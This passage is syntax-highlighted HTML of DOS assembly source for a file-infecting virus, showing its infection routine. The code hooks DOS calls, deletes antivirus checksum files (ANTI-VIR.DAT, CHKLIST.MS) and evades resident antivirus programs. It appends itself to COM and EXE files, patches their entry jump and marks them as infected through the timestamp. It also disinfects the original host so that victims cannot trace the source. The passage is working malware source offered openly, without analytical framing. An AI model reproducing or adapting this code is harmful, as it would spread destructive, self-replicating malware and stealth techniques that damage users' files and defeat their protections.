        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Infecta2</span><span class="sc0">       </span><span class="sc1">; Jump</span><span class="sc0">

</span><span class="sc1">;; Infect handle</span><span class="sc0">
</span><span class="sc5">@@InfectaHandle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">           </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ParcheaInt24h</span><span class="sc0"> </span><span class="sc1">; Patch int 24, 1Bh and 23h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0004</span><span class="sc0">      </span><span class="sc1">; Check if it is a system handle</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@Fin00</span><span class="sc0">         </span><span class="sc1">; If it is, jump and exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">       </span><span class="sc1">; Duplicate handle</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin00</span><span class="sc0">         </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Put handle on BX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@SigueInfec01</span><span class="sc0">  </span><span class="sc1">; Jump</span><span class="sc0">

</span><span class="sc1">;; Infect by get/set attributes or terminate program</span><span class="sc0">
</span><span class="sc5">@@InfectaAtributos</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc5">@@Infecta</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSHA</span><span class="sc0">             </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
  </span><span class="sc5">@@Infecta2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ParcheaInt24h</span><span class="sc0"> </span><span class="sc1">; Patch int 24h, 1Bh and 23h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">       </span><span class="sc1">; Is get/set attributes function?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SigueInfec02</span><span class="sc0">  </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">       </span><span class="sc1">; Is execute program?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SigueInfec02</span><span class="sc0">  </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenNombre</span><span class="sc0">   </span><span class="sc1">; Routine to get the name of the program</span><span class="sc0">
                      </span><span class="sc1">; which is going to be terminated</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Desinfeccion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Is this value 0?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SigueInfec02</span><span class="sc0">   </span><span class="sc1">; If it is, continue normally</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Desinfeccion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrement this value</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InfectaKEYB</span><span class="sc0">    </span><span class="sc1">; If it is 0, infect KEYB.COM</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siguiente</span><span class="sc0">      </span><span class="sc1">; If it isn't 0, disinfect the program.</span><span class="sc0">
                </span><span class="sc1">; That's because normally the first program</span><span class="sc0">
                </span><span class="sc1">; which calls to "terminate execution" func-</span><span class="sc0">
                </span><span class="sc1">; tions is the infected host, so, doing this,</span><span class="sc0">
                </span><span class="sc1">; the host will be disinfected and the victim</span><span class="sc0">
                </span><span class="sc1">; doesn't know which file carried the virus to</span><span class="sc0">
                </span><span class="sc1">; his/her computer :)</span><span class="sc0">
</span><span class="sc5">@@SigueInfec02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BorraDATs</span><span class="sc0">    </span><span class="sc1">; Delete ANTI-VIR.DAT and CHKLIST.MS (if</span><span class="sc0">
                      </span><span class="sc1">; they exist)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2D00h</span><span class="sc0">    </span><span class="sc1">; Open file to infect</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin00</span><span class="sc0">        </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Put handle on BX</span><span class="sc0">
</span><span class="sc5">@@SigueInfec01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FakeHandle</span><span class="sc0">   </span><span class="sc1">; Fuck resident AVs :)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OperaHandle</span><span class="sc0">  </span><span class="sc1">; Check handle for many things. Returns</span><span class="sc0">
                      </span><span class="sc1">; the SFT of the handle in DS:DI</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin01</span><span class="sc0">        </span><span class="sc1">; If there is an error, exit</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">       </span><span class="sc1">; Put DS on ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">       </span><span class="sc1">; DS &lt;= CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4700h</span><span class="sc0">    </span><span class="sc1">; Get date/time of handle</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc1">; Save them</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">      </span><span class="sc1">; Get today's date</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01980d</span><span class="sc0">   </span><span class="sc1">; Convert it to packed on CX</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Subtract file's date</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin01</span><span class="sc0">     </span><span class="sc1">; If it's equal or one more, don't infect it</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin01</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CambiaAtributos</span><span class="sc0"> </span><span class="sc1">; Change file attributes and write per-</span><span class="sc0">
                    </span><span class="sc1">; missions by SFT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">LeeCabecera</span><span class="sc0"> </span><span class="sc1">; Read the first 18 bytes of the file</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Copy this 18 bytes to Cabecera2</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Cabecera2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000Ch</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSW</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CompruebaNombre</span><span class="sc0"> </span><span class="sc1">; Check if the name of the file is ne-</span><span class="sc0">
                    </span><span class="sc1">; arly the infected before</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If it is, don't infect it (anti-goat</span><span class="sc0">
                    </span><span class="sc1">; system)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get two first bytes of the file in AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4CB4h</span><span class="sc0">   </span><span class="sc1">; Are a "MOV AH,4C" instruction?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If they are, don't infect the file</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">    </span><span class="sc1">; Check if it is a "MOV AX,..."</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siguuuu</span><span class="sc0">     </span><span class="sc1">; If it isn't, jump and continue</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0"> </span><span class="sc1">; Check if it is a "MOV AX,4C??"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If it is, exit</span><span class="sc0">
 </span><span class="sc5">@@Siguuuu</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">    </span><span class="sc1">; Check if first instruction is a "JMP"</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Continua002</span><span class="sc0"> </span><span class="sc1">; If not, continue</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get seconds in CL</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">     </span><span class="sc1">; Are they "60"?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If they are, exit (already infected)</span><span class="sc0">
 </span><span class="sc5">@@Continua002</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B2A6h</span><span class="sc0">  </span><span class="sc1">; First two bytes = "MZ"?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InfectaEXE</span><span class="sc0">  </span><span class="sc1">; If they are, infect EXE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CF3h</span><span class="sc0">   </span><span class="sc1">; Are they "ZM"?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InfectaEXE</span><span class="sc0">  </span><span class="sc1">; Infect EXE, then</span><span class="sc0">
</span><span class="sc5">@@InfectaCOM</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Executable type=COM</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Store first three bytes in Los3bytes</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Los3bytes</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Los3bytes</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrFinal</span><span class="sc0">    </span><span class="sc1">; Handle pointer to the end of the file</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Size &gt; 65536?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; Then, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">   </span><span class="sc1">; Size &lt; 4096?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; Then, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E000h</span><span class="sc0">  </span><span class="sc1">; Size &gt; 57344?</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; Then, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiRoundedSize</span><span class="sc0"> </span><span class="sc1">; Check if file size is divisible by</span><span class="sc0">
                      </span><span class="sc1">; 512 or 500 (rounded size :)  )</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If it is, exit</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">   </span><span class="sc1">; Add PSP size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Set delta-offset</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0103h</span><span class="sc0">   </span><span class="sc1">; Subtract PSP size and 3 bytes to get</span><span class="sc0">
                    </span><span class="sc1">; JMP displacement</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save it onto stack</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazVirus</span><span class="sc0">    </span><span class="sc1">; Make a virus :)</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Recover AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; If error size, CX=0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If CX=0, then exit</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Add displacement to decryptor</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SaltoCOM</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Form a JMP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">;DS:DX=address of stored virus</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">     </span><span class="sc1">; Copy it to file</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If write error, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrInicio</span><span class="sc0">   </span><span class="sc1">; Go to the beginning of file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">SaltoCOM</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Write JMP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; If error, don't set seconds</span><span class="sc0">
      </span><span class="sc5">@@Fin03</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0"> </span><span class="sc1">; Set seconds to 60</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
      </span><span class="sc5">@@Fin02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4701h</span><span class="sc0">      </span><span class="sc1">; Put original date/time</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Fecha</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestauraAtributos</span><span class="sc0">  </span><span class="sc1">; Restore attributes</span><span class="sc0">
      </span><span class="sc5">@@Fin01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">UnfakeHandle</span><span class="sc0">       </span><span class="sc1">; Restore original handle</span><span class="sc0">
      </span><span class="sc5">@@Fin00</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ParcheaInt24h</span><span class="sc0">      </span><span class="sc1">; Unpatch int 24h, 1Bh and 23h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">     </span><span class="sc1">; Is it the "close handle" function?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SEUUF</span><span class="sc0">       </span><span class="sc1">; If it is, jump to SEUUF</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; Is it the "close FCB" function?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SEUUF</span><span class="sc0">       </span><span class="sc1">; If it is, jump to SEUUF</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">; Is it the "get/set attributes" func.?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FinInt21h</span><span class="sc0">   </span><span class="sc1">; If it is, jump to exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">     </span><span class="sc1">; Is it the "execute" function?</span><span class="sc0">
